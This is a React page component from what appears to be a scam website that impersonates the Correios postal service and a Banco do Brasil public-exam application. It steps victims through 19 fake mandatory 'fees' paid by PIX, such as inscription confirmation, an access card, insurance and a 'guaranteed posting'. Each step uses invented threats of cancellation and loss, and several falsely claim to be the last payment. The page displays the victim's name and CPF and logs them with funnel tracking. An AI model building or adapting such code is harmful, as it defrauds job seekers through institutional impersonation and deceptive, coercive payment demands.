import { useEffect, useMemo, useState } from "react";
import { useNavigate, useLocation, useParams } from "react-router-dom";
import { FileCheck, FileText, Shield, MapPin, CreditCard, Fingerprint, BookOpen, CheckSquare, Star } from "lucide-react";
import { Button } from "@/components/ui/button";
import CorreiosHeader from "@/components/CorreiosHeader";
import CorreiosFooter from "@/components/CorreiosFooter";
import { CPFData } from "@/lib/cpf";
import { getSession, saveSession, CepData, AgencyData } from "@/hooks/useSessionPersistence";

import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

interface UpsellInfoItem {
  title: string;
  valor: number;
  icon: typeof MapPin;
  headline: string;
  explicacao: string;
  items: string[];
  consequencias: string[];
  nota: string;
  botaoTexto: string;
}

const buildUpsellInfo = (cepData?: CepData, agencyData?: AgencyData): UpsellInfoItem[] => {
  const escolaNome = agencyData?.name
    || (cepData ? `Escola Municipal ${cepData.localidade}` : "Escola designada pelo sistema");
  const escolaCidade = agencyData?.endereco
    || (cepData ? `${cepData.localidade}/${cepData.uf}` : "Cidade será definida com base no seu CEP");

  return [
    {
      title: "Confirmação da Inscrição", valor: 47, icon: FileCheck,
      headline: "⚠️ ATENÇÃO: SUA INSCRIÇÃO SERÁ CANCELADA EM 24 HORAS",
      explicacao: "Sua inscrição está com status PENDENTE agora. Isso significa que seu nome NÃO APARECE na lista oficial de candidatos. Se você não confirmar AGORA, sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas e você VAI PERDER a vaga. O dinheiro que você já pagou NÃO será devolvido. A confirmação é OBRIGATÓRIA — sem ela, no dia da prova seu nome simplesmente NÃO vai estar lá e você será IMPEDIDO de entrar.",
      items: [
        "Status muda de PENDENTE para CONFIRMADA imediatamente",
        "Seu nome incluído na lista oficial de candidatos",
        "Número de protocolo definitivo gerado na hora",
        "Comprovante de inscrição enviado por e-mail",
        "Vaga GARANTIDA no concurso",
        "Confirmação válida em todo o território nacional",
      ],
      consequencias: [
        "Sua inscrição será CANCELADA AUTOMATICAMENTE em 24 horas",
        "Você VAI PERDER a vaga e TODO o dinheiro já investido",
        "NÃO haverá reembolso — o valor pago é PERDIDO",
        "Terá que refazer TODO o processo do ZERO no próximo concurso",
      ],
      nota: "⚠️ SEM A CONFIRMAÇÃO, SUA INSCRIÇÃO SERÁ CANCELADA E VOCÊ PERDE TUDO.",
      botaoTexto: "CONFIRMAR INSCRIÇÃO AGORA",
    },
    {
      title: "Confirmação do Local da Prova", valor: 37, icon: MapPin,
      headline: "Confirme seu local de prova para manter a prioridade de alocação",
      explicacao: cepData
        ? `Com base no CEP ${cepData.cep}, seu local de prova atual é ${escolaNome}, em ${escolaCidade}. Esta confirmação é obrigatória para manter a alocação prioritária perto da sua região. Sem confirmação no prazo, o sistema pode realocar para outra unidade com vaga disponível, aumentando custo de transporte e desgaste físico no dia da prova.`
        : "A confirmação do local é obrigatória para manter prioridade na unidade mais próxima. Sem pagamento no prazo, o sistema pode realocar sua prova para outra cidade ou bairro com disponibilidade.",
      items: [
        cepData ? `Local confirmado: ${escolaNome}` : "Prova priorizada na unidade mais próxima",
        cepData ? `Cidade: ${escolaCidade}` : "Local enviado por e-mail e SMS",
        "Sala com acessibilidade garantida",
        "Prioridade de alocação registrada no sistema",
        "Mapa com direções para o local da prova",
        "Possibilidade de ajuste de local dentro do prazo",
      ],
      consequencias: [
        "Realocação automática para unidade com vaga disponível",
        "Maior custo de deslocamento até o local da prova",
        "Risco de chegar cansado e com menor rendimento",
        "Perda da prioridade de alocação por CEP",
      ],
      nota: "Pagamento obrigatório para manter o local de prova priorizado na sua região.",
      botaoTexto: "CONFIRMAR LOCAL DE PROVA AGORA",
    },
    {
      title: "Cartão de Acesso à Prova", valor: 39, icon: CreditCard,
      headline: "🚫 SEM O CARTÃO VOCÊ NÃO ENTRA NA PROVA — PONTO FINAL",
      explicacao: "O Cartão de Acesso é o documento OBRIGATÓRIO para entrar no local de prova. Os fiscais NÃO vão deixar você entrar sem ele — NÃO IMPORTA se seu nome está na lista. Sem o cartão, você fica do lado de FORA assistindo os outros candidatos entrarem. Todo o dinheiro investido, todo o tempo estudando — JOGADO NO LIXO porque você não tinha o cartão.",
      items: [
        "Documento oficial com seu nome, foto e CPF",
        "Número da sala e horário exato da prova",
        "QR Code para entrada RÁPIDA sem fila",
        "Versão digital disponível no celular",
        "Local da prova com endereço completo",
        "Código de barras para conferência dos fiscais",
        "Válido como documento de identificação no local",
      ],
      consequencias: [
        "Você será IMPEDIDO DE ENTRAR no local da prova",
        "PERDERÁ a inscrição e TODOS os valores pagos",
        "NÃO haverá segunda chance — a prova acontece UMA ÚNICA VEZ",
        "Meses de estudo JOGADOS NO LIXO",
      ],
      nota: "🚫 SEM O CARTÃO = SEM PROVA. SEM PROVA = SEM VAGA. É SIMPLES ASSIM.",
      botaoTexto: "GARANTIR MEU CARTÃO DE ACESSO AGORA",
    },
    {
      title: "Seguro do Candidato", valor: 27, icon: Shield,
      headline: "⚠️ SE O CONCURSO FOR CANCELADO, VOCÊ PERDE TODO SEU DINHEIRO",
      explicacao: "Concursos são cancelados o tempo todo. Já aconteceu DEZENAS de vezes e milhares de candidatos PERDERAM TUDO que pagaram — sem direito a reembolso, sem recurso, sem nada. Se isso acontecer e você NÃO tiver o seguro, seu dinheiro VAI PRO LIXO. Com o seguro, você recebe 100% DE VOLTA em qualquer situação. É a única proteção que existe.",
      items: [
        "Reembolso de 100% se o concurso for cancelado",
        "Cobertura total se a prova for adiada",
        "Proteção contra erro ou falha no sistema",
        "Suporte jurídico GRATUITO pra reclamar seus direitos",
        "Cobertura para problemas no dia da prova",
        "Reembolso processado em até 7 dias úteis",
      ],
      consequencias: [
        "Se o concurso for cancelado, você PERDE TUDO — sem reembolso",
        "NÃO terá direito a nenhum valor de volta",
        "Ficará SEM suporte jurídico se houver irregularidades",
        "Vai ter que engolir o prejuízo calado",
      ],
      nota: "⚠️ SEM SEGURO = SEM PROTEÇÃO. SE CANCELAR, VOCÊ PERDE TUDO.",
      botaoTexto: "PROTEGER MEU INVESTIMENTO AGORA",
    },
    {
      title: "Apostila Digital Oficial", valor: 33, icon: BookOpen,
      headline: "📚 CANDIDATOS COM MATERIAL OFICIAL PASSAM 3X MAIS",
      explicacao: "Esta apostila foi elaborada com base no conteúdo EXATO do edital — as matérias que VÃO CAIR na prova. Enquanto você estuda às cegas, outros candidatos estão estudando EXATAMENTE o que vai ser cobrado. Candidatos que usam material oficial têm taxa de aprovação 3X MAIOR. Você vai competir com eles sem esse material?",
      items: [
        "Conteúdo completo de TODAS as matérias do edital",
        "Questões comentadas de provas anteriores da MESMA banca",
        "Resumos e mapas mentais para revisão rápida",
        "Acesso IMEDIATO após pagamento",
        "PDF — acesse no celular, tablet ou computador",
        "Atualizações automáticas se o edital mudar",
        "Gabaritos comentados passo a passo",
      ],
      consequencias: [
        "Vai estudar SEM SABER o que realmente cai na prova",
        "Risco ALTÍSSIMO de reprovar por falta de preparação",
        "Outros candidatos terão VANTAGEM ENORME sobre você",
        "Vai perder tempo estudando o que NÃO cai",
      ],
      nota: "📚 QUEM ESTUDA COM MATERIAL OFICIAL PASSA. QUEM NÃO ESTUDA, REPROVA.",
      botaoTexto: "BAIXAR APOSTILA OFICIAL AGORA",
    },
    {
      title: "Simulado Online da Banca", valor: 24, icon: FileText,
      headline: "🎯 FAÇA A PROVA ANTES DA PROVA — SIMULADO IDÊNTICO",
      explicacao: "Este simulado reproduz EXATAMENTE o formato, tempo e dificuldade da prova real. Quem faz simulado chega no dia da prova PREPARADO — sabe o formato, sabe administrar o tempo, sabe o que esperar. Quem NÃO faz, chega nervoso, perde tempo e REPROVA. Simples assim.",
      items: [
        "Mesmo tempo e formato da prova oficial",
        "Correção automática com gabarito comentado",
        "Ranking geral com outros candidatos",
        "Refaça QUANTAS VEZES quiser até o dia da prova",
        "Relatório de desempenho por matéria",
        "Identifica seus pontos fracos pra focar no estudo",
        "Cronômetro simulando a pressão real da prova",
      ],
      consequencias: [
        "Vai entrar na prova SEM SABER o formato das questões",
        "NÃO vai saber administrar o tempo — vai se desesperar",
        "Nervosismo e surpresa no dia = REPROVAÇÃO",
      ],
      nota: "🎯 QUEM FAZ SIMULADO, PASSA PREPARADO. QUEM NÃO FAZ, LEVA SUSTO.",
      botaoTexto: "FAZER SIMULADO AGORA",
    },
    {
      title: "Certificado de Pré-Aprovação", valor: 19, icon: Fingerprint,
      headline: "📄 PRECISA FALTAR NO TRABALHO? ESTE CERTIFICADO RESOLVE",
      explicacao: "O Certificado de Pré-Aprovação comprova que você é candidato oficial e está apto a fazer a prova. A maioria dos candidatos USA este certificado para justificar falta no trabalho — empresas ACEITAM como comprovante oficial. Sem ele, você pode levar FALTA, ter DESCONTO no salário ou até ADVERTÊNCIA.",
      items: [
        "Certificado com seus dados completos e protocolo",
        "ACEITO por empresas para justificar falta no trabalho",
        "Comprova que você é candidato oficial do concurso",
        "Válido em todo o território nacional",
        "Formato digital e impresso",
        "Número de registro único para verificação online",
      ],
      consequencias: [
        "NÃO terá documento para justificar falta no trabalho",
        "Pode ter DESCONTO no salário ou ADVERTÊNCIA por falta",
        "Não poderá comprovar que é candidato oficial",
      ],
      nota: "📄 SEM CERTIFICADO = FALTA INJUSTIFICADA NO TRABALHO.",
      botaoTexto: "GERAR MEU CERTIFICADO AGORA",
    },
    {
      title: "Acompanhamento por SMS e E-mail", valor: 15, icon: CheckSquare,
      headline: "📱 NÃO FIQUE POR FORA — RECEBA TODOS OS AVISOS",
      explicacao: "Concursos mudam datas, locais e regras SEM AVISO. Se você não ficar sabendo a tempo, pode ir pro local ERRADO ou perder um prazo IMPORTANTE. Já aconteceu com milhares de candidatos que PERDERAM a vaga por não saber de uma mudança. Com o acompanhamento, você recebe TUDO direto no celular — ANTES de todo mundo.",
      items: [
        "Alerta IMEDIATO de mudança de data ou local",
        "Gabarito oficial enviado no DIA da prova",
        "Resultado ANTES da publicação no site oficial",
        "Avisos importantes por SMS direto no celular",
        "Lembretes automáticos antes da prova",
        "Notificação de convocação para posse",
        "Atualizações sobre recursos e mudanças no edital",
      ],
      consequencias: [
        "Pode PERDER prazos importantes sem saber",
        "Risco de ir pro LOCAL ERRADO no dia da prova",
        "Vai descobrir o resultado DEPOIS de todo mundo",
        "Pode perder a CONVOCAÇÃO para posse sem saber",
      ],
      nota: "📱 QUEM NÃO SE CADASTRA, PERDE PRAZO E PERDE VAGA.",
      botaoTexto: "ATIVAR ALERTAS AGORA",
    },
    {
      title: "Garantia de Vaga na Região", valor: 97, icon: Star,
      headline: "GARANTA QUE VAI TRABALHAR PERTO DE CASA",
      explicacao: "Com esta taxa, se você for aprovado, vai trabalhar na agência MAIS PERTO da sua casa. Sem essa garantia, o órgão pode te enviar para QUALQUER cidade do estado — a CENTENAS de quilômetros de onde você mora. Imagine passar no concurso e ter que se mudar pra uma cidade que você nem conhece. Com a garantia, você ESCOLHE onde trabalha.",
      items: [
        "Trabalhe na agência do Banco do Brasil MAIS PERTO de você",
        "Prioridade TOTAL na escolha da cidade de lotação",
        "Acompanhamento VIP de todo o processo até a posse",
        "Inscrição 100% CONCLUÍDA após este pagamento",
        "Suporte dedicado para dúvidas sobre o concurso",
        "Garantia registrada no sistema com número de protocolo",
        "Certificado de inscrição completa enviado por e-mail",
      ],
      consequencias: [
        "Pode ser enviado para QUALQUER cidade do estado — sem escolha",
        "NÃO terá prioridade na escolha do local de trabalho",
        "Sua inscrição ficará como INCOMPLETA no sistema",
        "Pode ter que se MUDAR para cidade desconhecida",
      ],
      nota: "🏆 ÚLTIMA TAXA. APÓS O PAGAMENTO, SUA INSCRIÇÃO ESTARÁ 100% CONCLUÍDA. NÃO DEIXE PRA DEPOIS.",
      botaoTexto: "FINALIZAR MINHA INSCRIÇÃO AGORA",
    },
    {
      title: "Kit Documentos para Posse", valor: 29, icon: FileCheck,
      headline: "📋 SEM ESSES DOCUMENTOS VOCÊ NÃO TOMA POSSE — MESMO APROVADO",
      explicacao: "Ser aprovado é SÓ METADE do caminho. Para tomar posse, você precisa apresentar uma lista ENORME de documentos — e se faltar UM ÚNICO, sua posse é CANCELADA e a vaga vai pro próximo da lista. O Kit Documentos organiza TUDO pra você: checklist completo, modelos prontos e orientação passo a passo. Milhares de aprovados PERDERAM a vaga por não ter a documentação certa.",
      items: [
        "Checklist completo de TODOS os documentos exigidos",
        "Modelos prontos de declarações e requerimentos",
        "Guia passo a passo para obter cada documento",
        "Alertas de prazos para entrega da documentação",
        "Orientação sobre exame admissional",
        "Modelo de recurso caso algum documento seja recusado",
      ],
      consequencias: [
        "Pode PERDER A POSSE por falta de documento",
        "Vaga vai para o PRÓXIMO da lista sem aviso",
        "NÃO terá orientação sobre quais documentos precisa",
        "Risco de perder prazo e ser ELIMINADO do concurso",
      ],
      nota: "📋 APROVADOS SEM DOCUMENTAÇÃO PERDEM A VAGA. NÃO DEIXE ISSO ACONTECER.",
      botaoTexto: "GARANTIR MEU KIT DE DOCUMENTOS AGORA",
    },
    {
      title: "Curso Preparatório Express", valor: 57, icon: BookOpen,
      headline: "🚀 CURSO INTENSIVO DE 7 DIAS — PASSE NA FRENTE DE MILHARES",
      explicacao: "Este curso foi criado para quem NÃO TEM TEMPO de estudar meses. Em 7 dias você aprende TUDO que precisa para passar. O conteúdo é focado APENAS no que cai na prova — sem enrolação. Candidatos que fizeram este curso tiveram nota MÉDIA 40% superior aos demais. Enquanto outros estão perdidos sem saber o que estudar, você vai direto ao ponto.",
      items: [
        "7 módulos intensivos — um por dia",
        "Videoaulas curtas e direto ao ponto",
        "Exercícios práticos após cada módulo",
        "Material complementar em PDF",
        "Acesso por 1 ano após a compra",
        "Suporte para dúvidas via chat",
        "Certificado de conclusão",
      ],
      consequencias: [
        "Vai estudar SEM DIREÇÃO e sem foco",
        "Outros candidatos preparados vão passar NA SUA FRENTE",
        "Risco ALTÍSSIMO de reprovar por falta de método",
        "Vai desperdiçar semanas estudando conteúdo errado",
      ],
      nota: "🚀 7 DIAS É TUDO QUE VOCÊ PRECISA. MAS SÓ SE COMEÇAR AGORA.",
      botaoTexto: "COMEÇAR CURSO INTENSIVO AGORA",
    },
    {
      title: "Recurso Administrativo", valor: 22, icon: Shield,
      headline: "⚖️ FOI PREJUDICADO NA PROVA? SEM RECURSO, VOCÊ PERDE CALADO",
      explicacao: "Erros acontecem em TODOS os concursos: questões anuladas, gabaritos errados, falhas no sistema. Se você for prejudicado e NÃO entrar com recurso, simplesmente PERDE. Com o Recurso Administrativo, você tem modelos PRONTOS e orientação jurídica para contestar qualquer irregularidade. Milhares de candidatos já GANHARAM vagas por recurso.",
      items: [
        "Modelos de recurso prontos para usar",
        "Orientação jurídica especializada em concursos",
        "Análise automática do gabarito oficial",
        "Identificação de questões passíveis de anulação",
        "Prazo monitorado — nunca perca a data do recurso",
        "Acompanhamento do resultado do recurso",
      ],
      consequencias: [
        "Se for prejudicado, NÃO poderá recorrer",
        "Questões erradas vão contar CONTRA você",
        "Outros candidatos VÃO recorrer e ganhar pontos — você não",
        "Pode perder a vaga por FRAÇÕES de ponto",
      ],
      nota: "⚖️ SEM RECURSO = SEM DEFESA. VOCÊ ACEITA O RESULTADO SEM PODER RECLAMAR.",
      botaoTexto: "GARANTIR MEU RECURSO AGORA",
    },
    {
      title: "Atualização do Edital", valor: 17, icon: FileText,
      headline: "📢 O EDITAL PODE MUDAR A QUALQUER MOMENTO — VOCÊ VAI FICAR SABENDO?",
      explicacao: "Editais de concurso são RETIFICADOS o tempo todo — mudam datas, conteúdos, número de vagas, requisitos. Se você não ficar sabendo de uma mudança, pode estudar MATÉRIA ERRADA ou perder um PRAZO CRUCIAL. Com a Atualização do Edital, você recebe IMEDIATAMENTE qualquer alteração, com análise do que mudou e como isso afeta sua preparação.",
      items: [
        "Alerta INSTANTÂNEO de retificações no edital",
        "Análise comparativa: o que mudou e por quê",
        "Impacto direto na sua preparação explicado",
        "Novos conteúdos adicionados destacados",
        "Mudanças de data e local atualizadas na hora",
        "Histórico completo de todas as alterações",
      ],
      consequencias: [
        "Pode estudar conteúdo que FOI RETIRADO do edital",
        "Risco de perder PRAZO alterado sem saber",
        "NÃO vai saber se mudaram o local ou data da prova",
        "Outros candidatos vão se adaptar — você NÃO",
      ],
      nota: "📢 EDITAL MUDA SEM AVISO. SE VOCÊ NÃO SOUBER, VAI ESTUDAR ERRADO.",
      botaoTexto: "ATIVAR ATUALIZAÇÕES DO EDITAL AGORA",
    },
    {
      title: "Prioridade na Correção", valor: 31, icon: CheckSquare,
      headline: "⏱️ SUA PROVA CORRIGIDA PRIMEIRO — RESULTADO EM ATÉ 48H",
      explicacao: "Normalmente o resultado demora SEMANAS. Com a Prioridade na Correção, sua prova entra na FILA PRIORITÁRIA e você recebe o resultado em até 48 horas. Isso significa que você fica sabendo ANTES de todo mundo se passou ou não — e pode começar a se preparar para a posse IMEDIATAMENTE enquanto os outros ainda estão esperando.",
      items: [
        "Prova corrigida em até 48 horas após aplicação",
        "Resultado individual enviado por SMS e e-mail",
        "Relatório detalhado de acertos por matéria",
        "Posição no ranking geral antes do resultado oficial",
        "Orientação imediata sobre próximos passos",
        "Acesso antecipado ao gabarito comentado",
      ],
      consequencias: [
        "Vai esperar SEMANAS pelo resultado — sem saber se passou",
        "NÃO terá relatório de desempenho por matéria",
        "Outros candidatos vão saber o resultado ANTES de você",
        "Vai perder tempo precioso esperando sem fazer nada",
      ],
      nota: "⏱️ RESULTADO EM 48H OU SEMANAS DE ESPERA. VOCÊ ESCOLHE.",
      botaoTexto: "QUERO RESULTADO PRIORITÁRIO",
    },
    {
      title: "Certificado de Conclusão de Curso", valor: 23, icon: Fingerprint,
      headline: "🎓 COMPROVE SUA ESCOLARIDADE — OBRIGATÓRIO PARA A POSSE",
      explicacao: "Para tomar posse no cargo de Agente Comercial, você PRECISA comprovar Ensino Médio completo. Se seu certificado estiver com problema, desatualizado ou se você perdeu o documento, sua posse será NEGADA. Com este serviço, garantimos que seu certificado está VÁLIDO e em conformidade com as exigências do edital.",
      items: [
        "Verificação completa do seu certificado escolar",
        "Orientação para obter segunda via se necessário",
        "Validação junto às instituições de ensino",
        "Documento formatado conforme exigências do edital",
        "Suporte para resolver pendências escolares",
        "Declaração de conformidade emitida",
      ],
      consequencias: [
        "Posse pode ser NEGADA por problema no certificado",
        "Vaga vai para o próximo candidato da lista",
        "NÃO terá tempo de resolver pendências depois",
        "Pode descobrir o problema TARDE DEMAIS",
      ],
      nota: "🎓 SEM CERTIFICADO VÁLIDO = SEM POSSE. RESOLVA AGORA, NÃO DEPOIS.",
      botaoTexto: "VALIDAR MEU CERTIFICADO AGORA",
    },
    {
      title: "Acesso ao Grupo VIP", valor: 14, icon: Star,
      headline: "👥 ENTRE NO GRUPO EXCLUSIVO DE CANDIDATOS APROVADOS",
      explicacao: "O Grupo VIP reúne candidatos que estão LEVANDO O CONCURSO A SÉRIO. Lá você encontra dicas exclusivas, macetes de prova, troca de experiências e MOTIVAÇÃO para não desistir. Candidatos isolados DESISTEM. Candidatos em grupo SE APOIAM e PASSAM JUNTOS. Além disso, ex-funcionários do Banco do Brasil compartilham como é o dia a dia do trabalho.",
      items: [
        "Grupo exclusivo no WhatsApp/Telegram",
        "Dicas diárias de estudo e macetes",
        "Troca de experiências com outros candidatos",
        "Depoimentos de aprovados em concursos anteriores",
        "Material extra compartilhado pelos membros",
        "Motivação diária para não desistir",
      ],
      consequencias: [
        "Vai estudar SOZINHO sem apoio de ninguém",
        "NÃO terá acesso a dicas e macetes exclusivos",
        "Risco maior de DESISTIR por falta de motivação",
        "Vai perder informações valiosas de quem já passou",
      ],
      nota: "👥 QUEM ESTUDA SOZINHO DESISTE. QUEM ESTUDA EM GRUPO, PASSA.",
      botaoTexto: "ENTRAR NO GRUPO VIP AGORA",
    },
    {
      title: "Seguro Contra Atraso", valor: 18, icon: Shield,
      headline: "⏰ CHEGOU ATRASADO NA PROVA? SEM SEGURO, VOCÊ PERDE TUDO",
      explicacao: "No dia da prova, QUALQUER IMPREVISTO pode acontecer: trânsito, ônibus quebrado, emergência familiar. Se você chegar UM MINUTO atrasado, os portões FECHAM e você fica do lado de FORA. Com o Seguro Contra Atraso, você tem cobertura total: reembolso integral, reagendamento prioritário e suporte imediato.",
      items: [
        "Reembolso INTEGRAL se não conseguir chegar a tempo",
        "Reagendamento prioritário para próxima aplicação",
        "Cobertura para problemas de transporte",
        "Suporte de emergência no dia da prova",
        "Cobertura para emergências médicas comprovadas",
        "Proteção contra greves e paralisações",
      ],
      consequencias: [
        "Se atrasar, PERDE a prova e todo o investimento",
        "NÃO terá direito a reagendamento",
        "Todo o dinheiro gasto será PERDIDO",
        "Terá que esperar o PRÓXIMO concurso — sem garantia de quando",
      ],
      nota: "⏰ UM MINUTO DE ATRASO = TUDO PERDIDO. O SEGURO É SUA ÚNICA PROTEÇÃO.",
      botaoTexto: "ATIVAR SEGURO CONTRA ATRASO",
    },
    {
      title: "Consultoria Individual", valor: 43, icon: BookOpen,
      headline: "🧑‍🏫 ORIENTAÇÃO PERSONALIZADA DE UM ESPECIALISTA EM CONCURSOS",
      explicacao: "Cada candidato tem pontos fortes e fracos DIFERENTES. Uma estratégia genérica NÃO funciona para todo mundo. Com a Consultoria Individual, um especialista analisa SEU perfil, identifica SUAS dificuldades e monta um plano de estudo PERSONALIZADO. Candidatos com orientação individual têm taxa de aprovação 5X MAIOR.",
      items: [
        "Sessão individual com especialista em concursos",
        "Análise do seu perfil e pontos fracos",
        "Plano de estudo PERSONALIZADO para você",
        "Estratégia de prova baseada no seu nível",
        "Dicas exclusivas da banca organizadora",
        "Acompanhamento até o dia da prova",
      ],
      consequencias: [
        "Vai estudar SEM ESTRATÉGIA e sem direção",
        "NÃO vai saber quais são seus pontos fracos",
        "Outros candidatos com orientação vão passar NA SUA FRENTE",
        "Risco de reprovar por estudar de forma INEFICIENTE",
      ],
      nota: "🧑‍🏫 ESTUDAR SEM ORIENTAÇÃO É COMO DIRIGIR SEM GPS. VOCÊ SE PERDE.",
      botaoTexto: "AGENDAR MINHA CONSULTORIA AGORA",
    },
    {
      title: "Pacote de Posse Garantida", valor: 67, icon: Star,
      headline: "🏅 PACOTE FINAL — TUDO QUE VOCÊ PRECISA PARA TOMAR POSSE",
      explicacao: "Este é o pacote DEFINITIVO. Inclui TUDO que você precisa desde a aprovação até o primeiro dia de trabalho: documentação, exames, orientação jurídica e acompanhamento completo. Candidatos aprovados que NÃO se preparam para a posse PERDEM A VAGA todos os anos. Com este pacote, você chega no dia da posse com TUDO resolvido.",
      items: [
        "Acompanhamento completo do processo de posse",
        "Orientação para exame médico admissional",
        "Checklist de documentos com status em tempo real",
        "Orientação jurídica para questões trabalhistas",
        "Guia do primeiro dia de trabalho no Banco do Brasil",
        "Suporte por 90 dias após a posse",
        "Certificado de inscrição COMPLETA e DEFINITIVA",
      ],
      consequencias: [
        "Pode PERDER A VAGA por não cumprir requisitos da posse",
        "NÃO terá orientação sobre exame médico",
        "Risco de ser ELIMINADO por falta de documentação",
        "Vai enfrentar a burocracia SOZINHO sem ajuda",
      ],
      nota: "🏅 ESTE É O ÚLTIMO PASSO. APÓS ESTE PAGAMENTO, SUA JORNADA ESTÁ COMPLETA.",
      botaoTexto: "GARANTIR MINHA POSSE AGORA",
    },
  ];
};

const UpsellInfo = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { step } = useParams<{ step: string }>();

  const parsedStep = parseInt(step || "1", 10);
  const stepNumber = isNaN(parsedStep) ? 1 : Math.min(Math.max(parsedStep, 1), 19);
  const currentIndex = stepNumber - 1;

  const session = getSession();
  const cpfData: CPFData | undefined = location.state?.cpfData || session?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio || session?.valorBeneficio;
  const protocolo: string | undefined = location.state?.protocolo || session?.protocolo;
  const cepData: CepData | undefined = session?.cepData;
  const agencyData: AgencyData | undefined = session?.agencyData;

  const upsellInfo = useMemo(() => buildUpsellInfo(cepData, agencyData), [cepData, agencyData]);
  const info = upsellInfo[currentIndex];

  const valorComCentavos = info.valor + (Math.floor(Math.random() * 99) + 1) / 100;

  const [pessoasOnline] = useState(() => Math.floor(Math.random() * 30) + 15);

  useEffect(() => { window.scrollTo(0, 0); }, [stepNumber]);

  useEffect(() => {
    if (!cpfData) { navigate("/"); return; }
    saveSession({ cpfData, currentStep: `/upsell-info/${stepNumber}`, valorBeneficio, protocolo, cepData });
    trackFunnelEvent(`upsell-info-${stepNumber}`, { cpf: cpfData.cpf });
  }, [cpfData, valorBeneficio, protocolo, navigate, stepNumber]);

  const handlePagar = () => {
    navigate(`/upsell/${stepNumber}`, { state: { cpfData, valorBeneficio, protocolo } });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <CorreiosHeader breadcrumb="Concursos > Agente Comercial > Confirmações de Etapa" />

      <main className="flex-1 px-4 py-6 sm:py-8">
        <div className="max-w-lg mx-auto space-y-5">

          <h1 className="titulo-institucional text-lg leading-tight">{info.headline}</h1>

          {/* Explicação detalhada */}
          <div className="rounded border-2 border-destructive/30 bg-muted/30 p-4 text-sm text-foreground leading-relaxed font-medium">
            {info.explicacao}
          </div>

          {/* Local da prova - dados do CEP (only on step 2) */}
          {stepNumber === 2 && (
            <table className="tabela-zebra">
              <thead><tr><th colSpan={2}>Local de prova atribuído ao seu CEP</th></tr></thead>
              <tbody>
                <tr><td className="font-semibold w-1/3">Escola</td><td className="font-bold">{agencyData?.name || (cepData ? `Escola Municipal ${cepData.localidade}` : 'Processando...')}</td></tr>
                <tr><td className="font-semibold">Cidade</td><td>{agencyData?.endereco || (cepData ? `${cepData.localidade}/${cepData.uf}` : 'Processando com base no seu CEP...')}</td></tr>
                {cepData && <tr><td className="font-semibold">CEP</td><td>{cepData.cep}</td></tr>}
                <tr><td className="font-semibold">Status</td><td className="font-bold text-destructive animate-pulse">Aguardando confirmação de pagamento</td></tr>
              </tbody>
            </table>
          )}

          {/* Items table */}
          <table className="tabela-zebra">
            <thead>
              <tr><th>O que está incluído nesta taxa</th></tr>
            </thead>
            <tbody>
              {info.items.map((item, i) => (
                <tr key={i}><td className="font-medium">• {item}</td></tr>
              ))}
            </tbody>
          </table>

          {/* Consequências */}
          <div className="rounded border-2 border-destructive/40 bg-muted p-4 space-y-2">
            <p className="font-bold text-destructive text-sm">Impactos em caso de não pagamento:</p>
            <ul className="space-y-1.5">
              {info.consequencias.map((c, i) => (
                <li key={i} className="text-sm text-destructive font-medium flex items-start gap-2">
                  <span className="mt-0.5">•</span>
                  <span>{c}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Candidato */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Dados do Candidato</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-1/3">Candidato</td><td>{cpfData.nome}</td></tr>
              <tr><td className="font-semibold">CPF</td><td>{cpfData.cpf}</td></tr>
            </tbody>
          </table>

          {/* Benefícios do Cargo */}
          <table className="tabela-zebra">
            <thead><tr><th colSpan={2}>Benefícios do Cargo — Agente Comercial</th></tr></thead>
            <tbody>
              <tr><td className="font-semibold w-2/5">Remuneração</td><td>Salário inicial de R$ 6.000,00 a R$ 9.000,00 + PLR</td></tr>
              <tr><td className="font-semibold">Jornada</td><td>30 horas semanais (jornada reduzida)</td></tr>
              <tr><td className="font-semibold">Vale-Alimentação</td><td>R$ 1.014,42/mês</td></tr>
              <tr><td className="font-semibold">Plano de Saúde</td><td>Cassi (família incluída)</td></tr>
              <tr><td className="font-semibold">Previdência</td><td>Previ — Banco do Brasil</td></tr>
            </tbody>
          </table>
          {/* Observação */}
          <div className="text-xs space-y-1 bg-muted border border-border rounded p-3">
            <p className="font-bold text-foreground">Atenção:</p>
            <p className="font-semibold text-foreground">• Esta etapa possui cobrança obrigatória para manter sua inscrição ativa no fluxo.</p>
            <p className="text-muted-foreground">• Pagamento via PIX com confirmação instantânea.</p>
          </div>

          {/* Valor */}
          <div className="rounded border-2 border-destructive bg-destructive/10 p-4 text-center space-y-1">
            <p className="text-sm font-bold text-foreground">VALOR DA TAXA — PAGAMENTO ÚNICO</p>
            <p className="text-4xl font-black text-primary">
              R$ {valorComCentavos.toFixed(2).replace('.', ',')}
            </p>
          </div>

          <Button onClick={handlePagar} className="w-full min-h-14 h-auto px-3 py-3 text-xs sm:text-sm leading-tight whitespace-normal text-center font-black tracking-normal">
            {info.botaoTexto}
          </Button>

          <p className="text-xs text-center text-destructive font-bold">
            O não pagamento desta taxa dentro do prazo pode gerar cancelamento automático da inscrição.
          </p>
        </div>
      </main>

      <CorreiosFooter />
    </div>
  );
};

export default UpsellInfo;
